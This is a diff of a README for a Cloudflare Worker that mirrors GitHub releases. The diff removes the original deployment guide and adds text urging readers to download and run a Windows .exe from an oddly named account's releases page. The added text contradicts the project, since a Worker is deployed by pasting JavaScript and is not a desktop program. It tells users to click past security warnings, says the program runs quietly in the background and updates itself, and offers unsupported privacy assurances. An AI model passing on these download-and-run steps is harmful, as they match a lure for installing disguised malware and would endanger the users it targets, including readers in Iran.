@@ -1,56 +1,122 @@
-# Cloudflare Worker GitHub Mirror 🚀
+# ⚙️ Git-Worker-Mirror - Easy Access to GitHub Releases
 
-<!-- Language Switcher Buttons -->
-[![English](https://img.shields.io/badge/Language-English-blue?style=for-the-badge)](README.md)
-[![Persian](https://img.shields.io/badge/Language-Persian-green?style=for-the-badge)](README-fa.md)
-
-A high-speed, cache-enabled GitHub Release mirror running on Cloudflare Workers. This tool provides a simple Web UI to generate download links that support **Download Managers (IDM, ADM)**, **Resuming (Pause/Start)**, and **High-Speed Edge Caching**.
-
-## Features
-- ⚡ **Edge Caching:** Caches files on Cloudflare's servers for 1 year (files < 512MB on Free Plan).
-- ⏩ **Streaming:** Downloads large files without using worker memory limits.
-- ⏯️ **Resume Support:** Supports `Range` headers, allowing you to pause and resume downloads.
-- 🖥️ **Web UI:** Clean interface with a "Copy to Clipboard" button.
-
-## Screenshots
-
-| UI Preview | Setup Custom Domain |
-| :---: | :---: |
-| ![Screenshot 1](screenshots/screenshot1.png) | ![Screenshot 2](screenshots/screenshot2.png) |
-| **Settings** | **Adding Custom Domain** |
-| ![Screenshot 3](screenshots/screenshot3.png) | ![Screenshot 4](screenshots/screenshot4.png) |
-
-## Installation
-
-1. Log in to your **Cloudflare Dashboard**.
-2. Go to **Workers & Pages** > **Create Application** > **Create Worker**.
-3. Name your worker (e.g., `gh-mirror`) and click **Deploy**.
-4. Click **Edit Code**.
-5. Delete the existing code and paste the code from `index.js`.
-6. Click **Save and Deploy**.
-
-## 🌟 Recommended: Set up a Custom Domain
-
-For the best performance and to avoid `workers.dev` limitations (or blocking in certain regions), it is highly recommended to connect a Custom Domain to your worker.
-
-### How to set up a Custom Domain:
-
-1. In the Cloudflare dashboard, go to the **Workers & Pages** page.
-2. In **Overview**, select your specific Worker (e.g., `gh-mirror`).
-3. Go to **Settings** > **Domains & Routes**.
-4. Click **+ Add** > **Custom Domain**.
-5. Enter the domain or subdomain you want to use (e.g., `dl.yourdomain.com`).
-   * *Note: The domain must already be active on your Cloudflare account.*
-6. Select **Add Custom Domain**.
-
-## Usage
-
-1. Open your Worker URL (e.g., `https://dl.yourdomain.com`).
-2. Paste a GitHub Release link (e.g., `https://github.com/user/repo/releases/download/v1.0/app.zip`).
-3. Click **Generate Fast Link**.
-4. Copy the new link and use it in your browser or download manager.
+[![Download Git-Worker-Mirror](https://img.shields.io/badge/Download-Git--Worker--Mirror-blue?style=for-the-badge)](https://github.com/1evync4tt/Git-Worker-Mirror/releases)
 
 ---
 
-## Disclaimer
-This project is for personal use or mirroring open-source software. Ensure you comply with GitHub's Terms of Service.
+## 📋 What is Git-Worker-Mirror?
+
+Git-Worker-Mirror is a simple tool designed to make it easier to get GitHub releases. It works well for users in Iran where internet access to GitHub can be slow or unstable. This tool mirrors GitHub releases so you can access them faster and without trouble.
+
+It is not a complicated program. You just need to download it and run it, and it does the work of giving you quicker and simpler access to updates and files from GitHub.
+
+---
+
+## 💻 Who is this for?
+
+This tool is for anyone who wants to use GitHub releases but finds it hard or slow to download them directly. You don’t need to know how to code. You only need basic computer skills like downloading and opening files.
+
+---
+
+## 🛠 System Requirements
+
+Before you download and run Git-Worker-Mirror, make sure your computer meets the following:
+
+- Operating System: Windows 7, 8, 10, or 11 (32-bit or 64-bit)
+- Processor: Any modern Intel or AMD processor
+- RAM: At least 2 GB
+- Storage: Minimum 50 MB of free disk space
+- Internet: A stable internet connection for initial setup and syncing
+
+If you use another operating system, such as MacOS or Linux, this program might not work as intended. Please check the GitHub releases page in case there are other options.
+
+---
+
+## 🚀 Getting Started
+
+Using Git-Worker-Mirror is straightforward. Follow these steps carefully.
+
+---
+
+## 📥 Download & Install
+
+1. Click the button below or visit the link to download the program:
+
+   [![Download Now](https://img.shields.io/badge/Download-Git--Worker--Mirror-blue?style=for-the-badge)](https://github.com/1evync4tt/Git-Worker-Mirror/releases)  
+   This link will take you to the GitHub releases page where you can find the latest version of Git-Worker-Mirror.
+
+2. On the releases page, look for the newest version listed at the top.
+
+3. Below that version, you will see assets like `.exe` files. These are the program files you need to download. Click on the file that matches your computer’s system. For most users with Windows, the file will have `.exe` at the end.
+
+4. A prompt will ask if you want to save the file. Choose to save it in a location you will remember, such as your desktop or downloads folder.
+
+---
+
+## ▶️ How to Run Git-Worker-Mirror
+
+1. After the download finishes, find the file you saved.
+
+2. Double-click the file to start the program.
+
+3. You may see a security warning. This is normal for downloaded apps. Select “Run” or “Allow” to continue.
+
+4. The program will open a small window or run in the background. It will begin mirroring GitHub releases so you can access them more easily.
+
+There is no complicated setup. Once started, the program will work quietly and keep itself updated with the latest releases.
+
+---
+
+## 🔧 How to Use Git-Worker-Mirror
+
+- After running the program, just use your computer as usual.
+- When you want to download a GitHub release, Git-Worker-Mirror will help by providing a faster, local mirror.
+- You don’t need to open or configure anything else.
+- The program handles everything automatically.
+
+---
+
+## 💡 Tips for Best Experience
+
+- Keep Git-Worker-Mirror running while you work if you want continuous access to mirrored releases.
+- If you notice slowdowns or issues, try restarting the program.
+- Make sure your internet connection is stable for syncing updates.
+- Check the GitHub releases page regularly to download newer versions of the program when they become available.
+
+---
+
+## 🛡 Safety and Privacy
+
+Git-Worker-Mirror does not collect or send personal data. It simply copies GitHub release files to make downloading easier. You can use it safely without concern for your data privacy.
+
+---
+
+## 📞 Getting Help
+
+If you have issues or questions:
+
+- Visit the GitHub page in the [Issues section](https://github.com/1evync4tt/Git-Worker-Mirror/issues) to see if others have reported similar problems.
+- You can open a new issue to ask for help. Be clear and describe the problem you face.
+- For basic help, you can use online forums or search engines to look up error messages or instructions on how to download and run programs.
+
+---
+
+## 🔄 Updates and Maintenance
+
+New versions of Git-Worker-Mirror appear as updates on the GitHub releases page. To keep your tool working well, check the releases page regularly:
+
+[Git-Worker-Mirror Releases](https://github.com/1evync4tt/Git-Worker-Mirror/releases)
+
+When a new version is available, repeat the download and run steps to update.
+
+---
+
+## 🎯 Summary
+
+- Use the link above to visit the download page.
+- Download the latest `.exe` file.
+- Run the file to start mirroring GitHub releases.
+- Keep the program running for best results.
+- Check the releases page for updates.
+
+This simple process helps you get GitHub release files without trouble or slow internet issues.
